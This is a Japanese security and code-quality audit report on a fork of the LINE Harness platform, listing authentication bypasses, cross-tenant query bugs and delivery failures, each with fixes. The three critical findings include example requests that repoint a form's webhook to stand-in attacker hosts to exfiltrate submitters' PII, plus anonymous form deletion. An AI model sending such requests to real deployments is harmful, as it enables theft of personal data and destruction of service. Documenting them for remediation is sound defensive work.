# LINE Harness 包括コードレビュー報告書

- **日付**: 2026-07-23
- **対象**: `rasenca/line-harness-oss`（`Shudesu/line-harness-oss` フォーク）全コードベース（約 81k LOC / worker・web・liff・packages）
- **コミット基準**: main `0bb43d3`
- **手法**: 17 次元のクリーンセッション・ファインダー → 各所見を独立検証者が対立的に反証（find→verify）。
  総エージェント **134**（初回 113 + 検証補完 21）・実 LLM 消費 約 **7.4M トークン**・ツール実行 約 1,400 回。
- **判定凡例**: `CONFIRMED`=検証者が実コードで悪用/誤動作を確認 / `PLAUSIBLE`=実在濃厚だが完全確証は保留（多くは多層防御の欠如・将来リスク） / `REJECTED`=反証され除外（5 件・本書に含めない）。深刻度は検証後の再評価値。

> ⚠️ この報告書は upstream 由来コードを含む監査結果。フォーク安全の観点から本書は記録であり、修正は別途 PR で行う（ADR-0002）。

## サマリ

| 深刻度 | 件数 |
|---|---|
| 🔴 CRITICAL | 3 |
| 🟠 HIGH | 14 |
| 🟡 MEDIUM | 29 |
| ⚪ LOW | 39 |
| ℹ️ INFO | 6 |
| **合計** | **91** |

| 観点グループ | 件数 |
|---|---|
| セキュリティ (SEC) | 21 |
| 個人情報保護 (PII) | 19 |
| バグ/正当性 (BUG) | 39 |
| 横断(設定/フロント) (X) | 12 |

検証内訳: CONFIRMED 81 / PLAUSIBLE 10。REJECTED 5 件は反証され除外済み。

## 🚨 デプロイ前に必ず対処（CRITICAL / HIGH）

以下は「安心してデプロイする」ために優先で塞ぐべき項目。CRITICAL は独立3次元が同一根本原因を確認。

### 1. [🔴 CRITICAL] auth skip が HTTP メソッドを無視し PUT/DELETE /api/forms/:id が完全に未認証(匿名でフォーム改ざん・削除・回答PII窃取)

- **観点**: セキュリティ / `sec-authn-authz` ・ **判定**: `CONFIRMED` ・ 分類: authz-bypass
- **場所**: `apps/worker/src/middleware/auth.ts:179`

**内容**: authMiddleware の公開パス判定 `path.match(/^\/api\/forms\/[^/]+$/)` はコメント通り『GET フォーム定義を LIFF 向けに公開』する意図だが、HTTP メソッドを一切見ずにパスだけで `return next()` している(auth.ts:186-208 のトークン検証にすら到達しない)。ところが forms ルータは同一パスに `forms.put('/api/forms/:id')`(forms.ts:147, フォーム更新)と `forms.delete('/api/forms/:id')`(forms.ts:200, 削除)を登録しており、どちらのハンドラも c.get('staff') 等の独自認可を一切持たない。結果、これら変更系が匿名到達可能。form id は crypto.randomUUID だが GET /api/forms/:id(公開)で読め、かつ LIFF フォーム URL として全受信者に配布されるため実質秘密ではない。rate-limit も /api/forms/:id は UNAUTHENTICATED_PATTERNS 外・トークン無しで IP 単位 100/min 許容のため抑止にならない。

**失敗シナリオ**: 攻撃者が過去に配布された LIFF フォーム URL などから form id(UUID)を1つ入手。(1) 認証・Cookie・CSRF ヘッダ一切なしで `PUT /api/forms/<id>` に {"onSubmitWebhookUrl":"https://evil.example/collect","onSubmitWebhookHeaders":"..."} を送ると、以降そのフォームの全回答(氏名/メール/電話等の入力PII)が on-submit webhook 経由で攻撃者サーバへ送信され続ける(PII 継続漏洩)。あるいは {"isActive":false} で受付停止、fields 差し替えで内容改ざん。(2) `DELETE /api/forms/<id>` でフォームを匿名削除しデータ破壊/業務停止。いずれもオーナー/スタッフ認証もCSRFも不要。

**悪用可能性/再現条件**: 前提条件は「有効なフォーム UUID を1つ知っていること」のみ。この UUID は設計上 GET /api/forms/:id で公開され、かつ LIFF フォーム URL として LINE 友だち全員にブロードキャストされるため、稼働中フォームでは全受信者・リンク転送先・ブラウザ履歴/リファラ経由で容易に入手可能(非秘密)。再現: 認証・Cookie・CSRF ヘッダ一切なしで `PUT /api/forms/<uuid>` に {"onSubmitWebhookUrl":"https://evil.example/collect","onSubmitWebhookHeaders":"{...}"} を送信 → 以降の全回答 PII が攻撃者サーバへ流出継続。`DELETE /api/forms/<uuid>` で匿名削除。`PUT {"isActive":false}` で受付停止。rate-limit(100/min, /api/forms/:id はトークン無し IP 単位)は認可を提供せず抑止にならない。制約: UUIDv4 は列挙不能で GET /api/forms(一覧)は認証必須のため、リンク未入手フォームへの無差別攻撃は不可(標的は id 既知のフォームに限定)。それでも1リンクの入手で当該テナントのフォーム改ざん/削除/PII 継続窃取が成立し、公開配布される性質上ハードルは極めて低い。

**推奨対応**: 公開スキップをメソッドで限定する。例: フォーム定義の公開読み取りは GET のみ許可し(`SAFE_METHODS.has(method) && path.match(/^\/api\/forms\/[^/]+$/)` のように条件化)、PUT/PATCH/DELETE は必ず認証・CSRF・requireRole を通す。加えて forms.put/forms.delete 側にも requireRole('owner','admin') 等の明示ガードを付け、ミドルウェア設定ミスに対する多層防御とする。他の公開正規表現(/submit,/opened,/partial,/receive,/image)も本来 POST/GET 単一用途なので、同様にメソッド固定にしておくと将来の再発を防げる。

<details><summary>検証者の根拠</summary>

3つの load-bearing な事実を全て実コードで確認した。(1) auth.ts:179 の `path.match(/^\/api\/forms\/[^/]+$/)` は公開パス判定 `||` チェーン内にあり、HTTP メソッドを一切見ずに line 184 `return next()` へ短絡する。`new URL(c.req.url).pathname` はクエリ文字列を除去するため PUT/DELETE /api/forms/<uuid> も一致し、トークン抽出(186行〜)にも CSRF ゲート(199行〜)にも到達しない。(2) forms.ts:147(PUT)と forms.ts:200(DELETE)は同一 `/api/forms/:id` に登録され、いずれのハンドラも c.get('staff') を読まず独自認可も一切持たず、直接 updateForm/deleteForm を呼ぶ。(3) index.ts:152 `app.use('*', authMiddleware)` は全メソッド対象のワイルドカードで、forms マウント(186行)より前に登録されているため PUT/DELETE も確実にこのバイパス middleware を通る。結果、認証・Cookie・CSRF ヘッダ一切なしで匿名到達可能。悪用も裏取り済み: submit ハンドラ(forms.ts:351-352, 635-666)は on_submit_webhook_url へ submissionData(氏名/メール/電話等の生 PII)を POST するため、PUT で onSubmitWebhookUrl を攻撃者サーバに差し替えると全回答が継続的に流出する。しかも攻撃者エンドポイントが {eligible:true} を返せばフォームは正常動作を装ったまま PII を吸い出せる(ステルス)。DELETE でデータ破壊、isActive:false で受付停止、fields 差し替えで改ざん/フィッシングも可能。form id は GET /api/forms/:id(同 line 179 で公開)で読め、LIFF フォーム URL として全受信者に配布されるため実質秘密ではない。所見の記述に事実誤認・ガードによる無効化・到達不能は無い。唯一補足すべきは、UUIDv4 かつ一覧 GET /api/forms は認証済み(単一セグメント正規表現に非一致)のため『全フォームの網羅的列挙』は不可という点。ただし配布/漏洩した1つのリンクだけで当該フォームは完全に侵害される。

</details>

### 2. [🔴 CRITICAL] 公開GET用の正規表現がメソッド非依存で /api/forms/:id の PUT/DELETE を無認証開放

- **観点**: セキュリティ / `sec-public-webhooks` ・ **判定**: `CONFIRMED` ・ 分類: broken-access-control
- **場所**: `apps/worker/src/middleware/auth.ts:179`

**内容**: authMiddleware の allowlist は path のみで判定しメソッドを見ない。`path.match(/^\/api\/forms\/[^/]+$/)`(コメントは『GET form definition (public for LIFF)』)が、同一パスの PUT(forms.ts:147 updateForm)と DELETE(forms.ts:200 deleteForm)まで認証スキップ対象にしてしまう。両ハンドラに内部認証は無い。結果、任意の第三者が任意テナントのフォームを改ざん・削除できる。

**失敗シナリオ**: Authorization ヘッダ無しで `DELETE /api/forms/<id>` → 200 でフォーム削除(データ消失)。あるいは `PUT /api/forms/<id>` に {"onSubmitWebhookUrl":"https://evil/collect"} を送ると、以降の全 submit(氏名等フォーム入力PIIを含む)が攻撃者サーバへ POST される。onSubmitMessageContent を書き換えれば公式アカウントの push 本文も乗っ取れる。

**悪用可能性/再現条件**: 前提条件は「対象フォームの UUID を知っていること」のみ(認証情報は一切不要)。UUIDv4 は総当り不能だが、フォームは LINE ユーザーへ LIFF リンク/OGP ランディングとして公開配布される設計で、同一パスの GET /api/forms/:id も無認証公開のため、稼働中フォームの ID は実質公開情報。攻撃者はフォームリンク入手(フォロワー化、広告リンククリック、OGP ページ収集)→ GET で ID 確認 → 再現手順: (a) `DELETE /api/forms/<id>`(Authorization 無し)で任意テナントのフォームを削除しデータ消失。(b) `PUT /api/forms/<id>` に {"onSubmitWebhookUrl":"https://evil/collect"} を送ると以降の全 submit の入力PII(氏名等)が攻撃者サーバへ送信され、攻撃者が {eligible:true} を返せば利用者に気付かれず継続窃取可能。(c) onSubmitMessageContent 書換で公式アカウントの push 本文を乗っ取りフィッシング(tracked-link reward 設定フォームでは上書きされ無効)。単一 D1 相乗り+スコープ無し DELETE/UPDATE によりクロステナント影響。CSRF もスキップされるためブラウザ経由/直接 fetch のいずれでも成立。

**推奨対応**: allowlist をメソッド付きで判定する(例: GET かつ /api/forms/:id のみ許可)。フォーム定義の公開読取専用ルートを別パス(例 /api/public/forms/:id)に分離し、PUT/DELETE/submissions は必ず認証を通す。

<details><summary>検証者の根拠</summary>

所見の技術的主張は全て実コードで裏付けられた。(1) authMiddleware は index.ts:152 で `app.use('*', ...)` として全ルート(forms は index.ts:186 でマウント)より前に適用される。(2) allowlist は path のみで判定し、ループ本体は一切 c.req.method を参照しない。auth.ts:179 の `path.match(/^\/api\/forms\/[^/]+$/)`(コメント「GET form definition (public for LIFF)」)は任意メソッドで next() を返す。(3) 早期 return next()(auth.ts:183)は bearer/cookie/CSRF 判定(186行目以降)より前に発生するため、認証も CSRF も一切適用されない。(4) 同一パスの PUT(forms.ts:147→updateForm)と DELETE(forms.ts:200→deleteForm)が実在し、内部認証は皆無、c.get('staff') も参照しない。両者ともサフィックス無しの `/api/forms/<id>` 完全一致で当該正規表現にマッチする。(5) DB 層 updateForm/deleteForm(packages/db/src/forms.ts:184,253)は id のみキーでオーナーシップ/テナントスコープ無し(`DELETE FROM forms WHERE id = ?`)。単一 D1 相乗りのため任意テナントのフォームに到達する。悪用結果も確認: DELETE でフォーム消失(データ損失)、PUT onSubmitWebhookUrl 書換で callFormWebhook が submissionData(フォーム入力PII)を攻撃者URLへ送信でき、{eligible:true} を返せば正常動作を装って静かに窃取可能、PUT onSubmitMessageContent 書換で公式アカウント経由 push 本文を乗っ取れる(ただし tracked-link reward がある場合は forms.ts:585 でこの分岐が上書きされる)。唯一の留保: form ID は UUIDv4(crypto.randomUUID)で総当り不能。しかし同一パスの GET は意図的に公開され、フォームは LIFF リンク/OGP ランディングページで一般ユーザーに配布される設計のため、稼働中フォームの ID は事実上公開情報。認証情報ゼロでフォームリンクを入手した第三者は GET で確認後 PUT/DELETE 可能。到達不能・既存ガード・事実誤認のいずれも該当せず、実在かつ悪用可能。

</details>

### 3. [🔴 CRITICAL] 認証バイパス: /api/forms/:id の allowlist がメソッド無差別で PUT/DELETE も無認証化（全テナントのフォーム改竄・削除・提出データ流出）

- **観点**: セキュリティ / `sec-tenant-isolation` ・ **判定**: `CONFIRMED` ・ 分類: auth-bypass-cross-tenant
- **場所**: `apps/worker/src/middleware/auth.ts:179`

**内容**: authMiddleware の公開 allowlist はパスのみで判定しメソッドを見ない。179 行 `path.match(/^\/api\/forms\/[^/]+$/)` は「GET フォーム定義（LIFF 用公開）」の意図だが、同一パスの PUT（forms.ts:147 更新）と DELETE（forms.ts:200 削除）も同じ正規表現に一致し `return next()` で認証をスキップする。forms.ts の PUT/DELETE ハンドラ自体にも認可チェックは無い。フォームはテナント横断で使われる（usedByAccounts）ため、任意アカウントのフォームが無認証で書換・削除可能になる。

**失敗シナリオ**: 攻撃者が無認証で `PUT /api/forms/<formId>` に `{"onSubmitWebhookUrl":"https://evil.tld/collect","onSubmitWebhookHeaders":null}` を送ると、auth.ts:179 がメソッドを問わず一致し認証スキップ→forms.ts:147 がフォームを更新。以降その LIFF フォームの全提出で callFormWebhook（forms.ts:351-353）が提出者の PII（氏名/電話/アンケート回答）を evil.tld へ POST し続ける（提出データ流出）。同様に `DELETE /api/forms/<formId>` で任意アカウントのフォームを無認証削除、`{"isActive":false}` で受付停止(DoS)も可能。formId が UUID でも、公開 LIFF URL・OGP・提出フローから容易に露見する。

**悪用可能性/再現条件**: No authentication or CSRF token required. authMiddleware (apps/worker/src/middleware/auth.ts:179) allowlists /api/forms/:id by path only, with zero HTTP-method check, and `return next()` short-circuits before the CSRF gate (line 199). authMiddleware is globally registered (index.ts:152) ahead of the forms router (index.ts:186), and the PUT (forms.ts:147) and DELETE (forms.ts:200) handlers contain no authorization of their own. Repro: (1) obtain a formId — trivially public via LIFF share URLs (?page=form&id=<id>), OGP HTML (index.ts:787), QR codes, or the public submit flow; the intentionally-public GET /api/forms/:id also returns the full definition. (2) `PUT /api/forms/<id>` with `{"onSubmitWebhookUrl":"https://evil.tld/collect","onSubmitWebhookHeaders":null}` and no credentials → updateForm persists it → every subsequent /submit sends submitter PII to evil.tld via callFormWebhook (forms.ts:351-353, 635-682). (3) `DELETE /api/forms/<id>` deletes any form unauthenticated; `{"isActive":false}` disables intake (DoS). Since D1 is single-tenant-shared and forms are cross-account (usedByAccounts), this is a cross-tenant write/delete/exfil. Limiter: form IDs are UUIDs and the list endpoint GET /api/forms is authenticated, so blind mass-enumeration isn't possible — but any form with a live public link is fully compromised.

**推奨対応**: allowlist をメソッド付きで判定する（例: `c.req.method === 'GET' && path.match(/^\/api\/forms\/[^/]+$/)` のみ公開）。または forms ルータ側で GET のみ公開・PUT/DELETE/POST は authMiddleware 必須に分離する。あわせて他の allowlist エントリ（rich-menu 系等）もメソッド限定を確認。

<details><summary>検証者の根拠</summary>

Verified by reading the three relevant files. auth.ts:153-184 is a pure path-based allowlist with no method discrimination; line 179's regex `^\/api\/forms\/[^/]+$` matches PUT and DELETE to /api/forms/:id identically to the intended public GET, and the block ends in `return next()` (line 183) which skips both authenticateApiToken and the CSRF check. index.ts:152 registers authMiddleware globally before the forms router mount (index.ts:186), confirming reachability. forms.ts PUT (147-197) and DELETE (200-213) handlers perform no authz (no c.get('staff'), no router-level .use guard) and apply attacker-controlled fields including onSubmitWebhookUrl/onSubmitWebhookHeaders/isActive/fields. The submit path (forms.ts:351-353 → callFormWebhook 635-682) POSTs raw submissionData to the configured webhook, making the redirected-webhook exfiltration real. The regex correctly does NOT match /api/forms/:id/submissions (trailing segment), so submission listing stays authenticated — but future submissions leak via the tampered webhook regardless. Nothing invalidates the finding. Severity adjusted to critical: unauthenticated cross-tenant PII exfiltration plus data destruction/DoS on a shared multi-tenant resource, with the sole limiter being UUID knowledge, which is defeated because form IDs are routinely exposed in public LIFF/OGP/QR surfaces.

</details>

### 4. [🟠 HIGH] セグメント配信の operator=OR で account フィルタが第1句にしか掛からず、全アカウント(全テナント)の友だちが配信対象になる

- **観点**: バグ/正当性 / `bug-delivery-cron` ・ **判定**: `CONFIRMED` ・ 分類: correctness
- **場所**: `apps/worker/src/services/broadcast.ts:341`

**内容**: buildSegmentQuery (segment-query.ts:94-96) は複数ルールを括弧なしで ' OR ' 連結し `... FROM friends f WHERE c1 OR c2 OR c3` を生成する。cron キュー処理 (broadcast.ts:340-343) と /api/segments/count (broadcasts.ts:912) は account 絞り込みを `sql.replace('WHERE','WHERE f.line_account_id = ? AND')` という素朴な文字列置換で挿入するため、SQL の優先順位 (AND > OR) により最終式が `(line_account_id=? AND c1) OR c2 OR c3` となる。account フィルタは第1句にしか結合されず、c2/c3 に一致する友だちは line_account_id を問わず(=他アカウント/他テナント分も)対象集合に含まれる。単一 D1 全テナント相乗り構成のため、これは配信対象母集団の越境である。

**失敗シナリオ**: アカウント A のオペレータが operator=OR, rules=[tag_exists(タグX), ref_code='camp1'] のセグメント配信を送信。生成 SQL は `WHERE f.line_account_id='A' AND EXISTS(tagX) OR f.ref_code='camp1'`。結果、ref_code='camp1' を持つアカウント B・C の友だちも対象に混入する。preview-count/segments/count も同様に過大表示。実送信では A のトークンで multicast するため他チャネルの line_user_id が無効となり LINE が 400 を返してそのバッチ全体が失敗、混入バッチが毎 tick 再試行されて配信がウェッジする可能性もある。

**悪用可能性/再現条件**: 再現は容易。トリガ条件は「operator=OR かつ rules が2件以上」のセグメント配信で、通常のUI/API経路(POST /api/broadcasts/:id/send-segment)で誰でも到達できる。body.conditions は broadcasts.ts:588-598 で正規化・括弧付けされず segment_conditions にそのまま保存され、buildSegmentQuery(segment-query.ts:95)が clauses を括弧なしで ' OR ' 連結する。account フィルタは3箇所(broadcast.ts:341 / broadcasts.ts:912 / 追加で segment-send.ts:48)いずれも sql.replace('WHERE','WHERE f.line_account_id = ? AND') で挿入され、SQL 優先順位(AND>OR)により (line_account_id=? AND c1) OR c2 OR c3 となる。replace は最初の WHERE=本体 WHERE のみを置換するため置換対象自体は正しいが、AND が第1句にしか結合しない。単一 D1 全テナント相乗り構成でアプリ層 line_account_id スコープのみが分離境界なので、これは越境。\n確実に起こる被害: /api/segments/count の過大カウント、cron/送信経路で他テナントの friends 行(line_user_id 等 PII)がクエリ結果としてワーカーに読み込まれる、total_count の水増し。\n条件付き被害: 実配信は account A のトークンで multicast されるため LINE 側の友だちグラフで大半の他チャネル宛は届かない(=大規模な越境配信は起きにくい)。ただし A と B 両方の友だちである人物が B 由来の属性で混入した場合、A の配信を受信し得る(overlap ケースの誤配信)。申告の「400→バッチがウェッジ」は起こり得るが、LINE が 200 で非友だちを黙ってスキップする挙動もあり確実ではない。

**推奨対応**: buildSegmentQuery が返す WHERE 句全体を `WHERE (<clauses>)` と括弧で囲む。account フィルタは文字列 replace ではなく、生成側で `f.line_account_id = ? AND (<clauses>)` として最初から AND 結合する(replace 依存を廃止)。あわせて segments/count・segment-send.ts:48 も同一ロジックに寄せる。

<details><summary>検証者の根拠</summary>

所見は事実として正しく、無効化するガードは存在しない。(1) segment-query.ts:94-96 は clauses.join(' OR ') を括弧なしで生成(line 95 に括弧付けなし)。(2) account フィルタ注入は broadcast.ts:341、broadcasts.ts:912 に加え segment-send.ts:48 の計3箇所で同一の素朴な文字列 replace を使用。(3) broadcasts.ts:586-598 で operator/rules はユーザ入力のまま無検証・無正規化で segment_conditions に保存され、operator='OR' + 複数ルールを容易に指定可能。結果 SQL は SQL 優先順位(AND>OR)により (f.line_account_id=? AND c1) OR c2 OR c3 と解釈され、第2句以降は line_account_id を問わず全テナントの friends にマッチする。従って配信対象母集団・カウントの越境は確定的に発生する。replace が最初の WHERE のみ置換する点も、本体 WHERE がサブクエリ WHERE より必ず前方にあるため置換対象は正しく、バグの成立を妨げない。実際のエンドユーザ誤配信は LINE の友だちグラフに部分的に緩和されるため申告の最悪シナリオ(バッチウェッジ)は不確実だが、越境 PII 読み取りとカウント水増しは確実で、マルチテナント SaaS のターゲティング・スコープ分離境界の破れとして深刻度 high 相当。到達不能・既存ガード・事実誤認のいずれも該当しないため CONFIRMED。

</details>

### 5. [🟠 HIGH] 非 dedup のキュー配信が処理中ハードクラッシュすると batch_offset=-1 かつ success_count>0 のまま、どちらの復旧系にも該当せず永久 stuck になる

- **観点**: バグ/正当性 / `bug-delivery-cron` ・ **判定**: `CONFIRMED` ・ 分類: recovery
- **場所**: `apps/worker/src/services/broadcast.ts:414`

**内容**: processQueuedBroadcastBatches は先頭で batch_offset=-1 にロックし (259)、while ループ中は batch_offset を -1 のまま保持して success_count のみ加算する (415-417)。batch_offset の再開可能値への永続化は multicast の catch 経路 (393) だけ。CPU/wall-clock 上限超過などの捕捉不能なハード終了がループ途中で起きると batch_offset=-1 のまま success_count>0 で残る。recoverStalledBroadcasts (packages/db/src/broadcasts.ts:374-415) の系統1は success_count=0 を要求 (388)、系統2は target_type='multi-account-dedup' を要求 (409) するため、非 dedup で success_count>0 の停滞行はどちらにも該当しない。getQueuedBroadcasts は batch_offset<0 を除外するため再投入もされない。PUT 編集復旧は draft/scheduled のみ対象 (broadcasts.ts:344) で 'sending' は救えない。

**失敗シナリオ**: タグ配信 5000 人 (10 バッチ) がキュー処理され、6 バッチ送信後 (success_count=3000, batch_offset=-1) に他の並列ジョブと合算した invocation の wall-clock 上限でランタイムが強制終了。次以降の tick で recoverStalledBroadcasts はこの行を拾わず、getQueuedBroadcasts も batch_offset=-1 で除外。broadcast は status='sending' のまま永久停止し、残り 2000 人へ配信されず、UI も 3000/5000 で固まる。D1 手動介入以外に復旧手段がない。

**悪用可能性/再現条件**: Not an attacker-facing exploit; a reliability/correctness defect triggered by ordinary operation plus a crash. Reproduction: (1) create a tag broadcast to >500 following friends (e.g. 5000 = 10 batches of 500); (2) POST /api/broadcasts/:id/send enqueues it (status='sending', batch_offset=0, segment_conditions set, target_type='tag'); (3) a cron tick's processQueuedBroadcasts locks it to batch_offset=-1 and begins the multi-batch loop, incrementing success_count per successful batch; (4) the worker isolate is terminated mid-loop after >=1 batch — via the shared cron invocation's CPU/wall-clock limit (processQueuedBroadcasts runs in Promise.allSettled alongside processScheduledBroadcasts/processStepDeliveries/etc. in one invocation, index.ts:908-917), isolate eviction, deploy, or an unhandled D1 error on the unwrapped success_count UPDATE that hits the log-only outer catch. The row is then left batch_offset=-1, success_count>0, target_type='tag' and matches none of getQueuedBroadcasts / recoverStalledBroadcasts(branch1: success_count=0)/(branch2: target_type='multi-account-dedup'). Result: broadcast permanently stuck in 'sending', partial delivery (e.g. 3000/5000 sent, remaining recipients never messaged), UI frozen at the partial count, recoverable only by manual D1 surgery. Probability per broadcast is moderate (needs a crash/error in the window after the first batch), and the window exists on every multi-batch non-dedup queued broadcast; impact when triggered is high (silent customer under-delivery + no automatic recovery), hence high severity despite non-deterministic triggering.

**推奨対応**: 非 dedup 経路でもバッチ成功ごとに batch_offset を currentOffset へ永続化する(現状の『-1 保持』設計をやめ、成功都度 offset+success を atomic 更新)。または recoverStalledBroadcasts に『非 dedup かつ batch_offset=-1 かつ success_count>0』を安全な閾値(例30分)で batch_offset を保存済みオフセットへ戻す系統を追加する。少なくとも stuck 検知アラートを入れる。

<details><summary>検証者の根拠</summary>

All load-bearing claims verified against source.

(1) processQueuedBroadcastBatches locks the row to batch_offset=-1 (broadcast.ts:258-260). (2) The send loop increments success_count via a bare UPDATE (broadcast.ts:415-417) and never advances batch_offset off -1 during processing. (3) The only place a resumable offset is written mid-flight is the multicast catch (broadcast.ts:388-395, updateBroadcastBatchProgress); loop completion (420-423) marks 'sent'. The outer wrapper at broadcast.ts:231-235 only logs the error and does NOT restore batch_offset.

Reachability of the enqueued non-dedup state confirmed: a tag broadcast >500 followers is queued via routes/broadcasts.ts:508-519 as status='sending', batch_offset=0, segment_conditions=<tagMarker>, target_type stays 'tag'. getQueuedBroadcasts then picks it up.

Recovery gap confirmed in packages/db/src/broadcasts.ts. After a mid-loop hard termination the row is status='sending', batch_offset=-1, success_count>0, target_type='tag', segment_conditions NOT NULL, sent_at NULL. Against every recovery exit:
 - getQueuedBroadcasts (343-354): requires batch_offset >= 0 → excludes -1.
 - recoverStalledBroadcasts branch 1 (386-391): requires success_count = 0 → excludes success_count>0.
 - recoverStalledBroadcasts branch 2 (404-412): requires target_type = 'multi-account-dedup' → excludes 'tag'/segment.
No branch matches; row is never re-queued and never unlocked. PUT edit (routes/broadcasts.ts:386-396) is a manual action that resets success_count but not batch_offset, so it is not an automatic rescue.

The finding is factually correct and the stuck state is real, reachable, and has zero automatic recovery. I additionally found the reachability is slightly BROADER than stated: because the outer catch (broadcast.ts:234) never rolls back the lock, a catchable exception thrown by the unwrapped success_count UPDATE (or anything between iterations) AFTER at least one successful batch produces the identical permanently-stuck row — it does not strictly require an uncatchable platform kill, though that is the primary trigger. The design asymmetry corroborates the gap: the dedup path was hardened with chunking + time-budget yield (broadcast.ts:313-321) and a dedicated 3-minute resume recovery branch, while the non-dedup path processes all batches in a single invocation with no per-batch offset persistence and no matching recovery.

</details>

### 6. [🟠 HIGH] tag_change / cv_fire automations with send_message (and rich-menu actions) silently no-op but are logged as success

- **観点**: バグ/正当性 / `bug-crm-automation` ・ **判定**: `CONFIRMED` ・ 分類: correctness
- **場所**: `apps/worker/src/services/event-bus.ts:253`

**内容**: executeAction() for send_message (line 253), switch_rich_menu (line 347) and remove_rich_menu (line 359) all guard with `if (!lineAccessToken || !friendId) break;`. `break` exits the switch and the function returns normally, so back in processAutomations the call is recorded as `{ success: true }` (event-bus.ts:163-164) and createAutomationLog writes status 'success'. But several fireEvent callers pass NO lineAccessToken: friends.ts:449 and :467 (tag_change add/remove), friend-tag-attach.ts:45 (auto-tag from booking flow), and stripe.ts:149 (cv_fire purchase). All of these carry a friendId, so the friendId guard at line 235 passes and control reaches the token guard, which breaks silently.

**失敗シナリオ**: Admin creates automation {event_type:'tag_change', conditions:{tag_id:'VIP'}, actions:[{type:'send_message', params:{content:'特典をお送りします'}}]}. A booking auto-tags the friend via attachTagAndFireSideEffects → fireEvent('tag_change') with no token → send_message hits `if(!lineAccessToken) break` → NOTHING is sent, yet automation_logs shows status='success'. Same for a cv_fire 'purchase thank-you' automation triggered from stripe.ts:149. Operators believe the message went out; the friend never receives it and there is no error to alert them.

**悪用可能性/再現条件**: 上記の通り

**推奨対応**: Either resolve the owning account's channel_access_token inside executeAction when it is missing (look up friend → line_account_id → line_accounts.channel_access_token), and/or make the missing-token path record success:false with an explanatory error instead of a silent `break`. At minimum, tag_change/cv_fire fireEvent callers should pass lineAccessToken/lineAccountId like webhook.ts:364 does.

<details><summary>検証者の根拠</summary>

所見の全主張をコードで individually 検証し、すべて事実と一致。(1) ガード `if (!lineAccessToken || !friendId) break;` は send_message(253)/switch_rich_menu(347)/remove_rich_menu(359) に実在。(2) break は switch を抜けるだけで executeAction は throw せず return するため、processAutomations の try は成功扱いとなり results に {success:true} が入り(163-164)、allSuccess で status='success' が書かれる(179)。(3) 対象4呼び出し元(friends.ts:449/467, friend-tag-attach.ts:45, stripe.ts:149)は friendId を渡すが lineAccessToken を渡さない — 直接確認済み。(4) friendId があるため line 235 の throw は起きず token ガードへ到達し silent break する。(5) event-bus 内に channel_access_token のフォールバック取得は無い。(6) 自動化作成 API は action type と event type の整合性を検証しないため当該設定は正当に作成可能。反証の試み: webhooks.ts:373 も token 無しだが friendId も無いため send_message は 235 で throw され failed 記録になる(silent 成功ではない)→所見のスコープは正しく、この経路は正当に除外されている。token を渡す webhook 経路(friend_add/message_received)は正常動作し、テストも常に 'channel-token' を渡すため壊れた経路を踏まない=見過ごされやすい。以上より到達可能・実害あり・誤ログ確定。深刻度は申告の high を維持: 顧客向けメッセージ(購入サンクス等 revenue 隣接フロー)やタグ起点メッセージ/リッチメニュー切替が無言で欠落し、かつ status='success' の虚偽ログにより運用者が検知・デバッグできない observability 欠陥を伴う。緩和要因(専用管理UIは未確認で設定は REST/MCP 経由、影響は当該内部イベント経路に限定)を勘案しても、正常利用で到達し検知不能な顧客影響がある点で high 妥当。medium との境界だが虚偽成功ログが検知を能動的に妨げる点を加重評価。

</details>

### 7. [🟠 HIGH] tag_change automations cannot distinguish add vs remove — they fire on both, causing unintended sends / enrollments / tag resurrection

- **観点**: バグ/正当性 / `bug-crm-automation` ・ **判定**: `CONFIRMED` ・ 分類: correctness
- **場所**: `apps/worker/src/services/event-bus.ts:204`

**内容**: matchConditions() (event-bus.ts:187-224) supports only score_threshold, tag_id, keyword and keyword_exact. It never inspects payload.eventData.action even though tag_change events carry action:'add' (friends.ts:449, friend-tag-attach.ts:45) or action:'remove' (friends.ts:467). There is no schema field to scope an automation to add-only, so every tag_change automation whose tag_id matches runs on BOTH the add and the remove of that tag.

**失敗シナリオ**: Automation {event_type:'tag_change', conditions:{tag_id:'trial'}, actions:[{type:'start_scenario', params:{scenarioId:'onboarding'}}]}. Staff removes the 'trial' tag from a friend → fireEvent('tag_change', {action:'remove'}) → condition matches → friend is (re)enrolled into onboarding on a removal. Worse, an automation whose action is add_tag with the same tagId will re-add a tag the operator just removed (removal fires tag_change → add_tag → tag comes back), making the tag impossible to remove via the UI.

**悪用可能性/再現条件**: セキュリティ脆弱性ではなく automation ロジックの誤動作(誤送信・誤登録)。前提: オペレーターが tag_id 条件付きの tag_change automation を1つでも作成していること(score_threshold/tag_id はプロダクトの主要機能であり、「タグ付与時に○○する」という自然な設計意図での作成が普通に起こる)。トリガー: スタッフが該当タグを外す通常操作(DELETE /api/friends/:id/tags/:tagId、REST 公開かつ admin UI から実行可能)。この時 action:'remove' が付くが matchConditions が無視するため、追加意図の automation が削除でも発火。特別な権限は不要(automation 設定=オペレーター権限、タグ削除=スタッフ権限)。結果は LINE 友だちへの意図しないメッセージ送信(送信ポリシー抵触/顧客への迷惑)、完了済みシナリオへの再登録による配信再送、send_webhook の誤発火、特定設定下でのタグ削除不能。add 限定にスコープする回避策がスキーマ上存在しないため、機能の既定挙動として体系的に誤発火する。

**推奨対応**: Add an `action` (add/remove) discriminator to matchConditions and to the automation conditions schema, defaulting existing tag_change rules to add-only, so removals do not trigger add-oriented automations.

<details><summary>検証者の根拠</summary>

所見の中核は事実として確認できた。matchConditions() (apps/worker/src/services/event-bus.ts:187-224) を全読したところ、判定に使うのは score_threshold / tag_id / keyword / keyword_exact のみで、payload.eventData.action も conditions.action も一切参照していない。一方 tag 追加/削除は同一の 'tag_change' イベントで発火し、区別は eventData.action だけに載る:friends.ts:449 が action:'add'、friends.ts:467(DELETE ルート)が action:'remove'、friend-tag-attach.ts:45 が action:'add'。よって tag_id で絞った tag_change automation は追加でも削除でも同一に条件マッチし、両方で actions が走る。さらに automations.conditions は自由形式の Record<string,unknown>(automations.ts:41,46)で、仮に "action":"add" を書いても matchConditions が読まないため add 限定にスコープする手段がスキーマ上・実行時ともに存在しない、という所見の主張も裏付けられた。他箇所のガードによる無効化も見当たらない。

想定失敗シナリオの検証:
(1) start_scenario:onboarding を持つ automation で 'trial' タグを外す→削除でも条件マッチ→enrollFriendInScenario が実行。enrollFriendInScenario は INSERT OR IGNORE を使い、unique index idx_friend_scenarios_unique は部分インデックス(WHERE status != 'completed')。したがって「現在アクティブ」なら重複挿入は抑止されるが、過去に completed 済みの友だち(または未登録の友だち)はタグ「削除」で新規アクティブ登録され、オンボーディング配信が丸ごと再送される。実害あり。
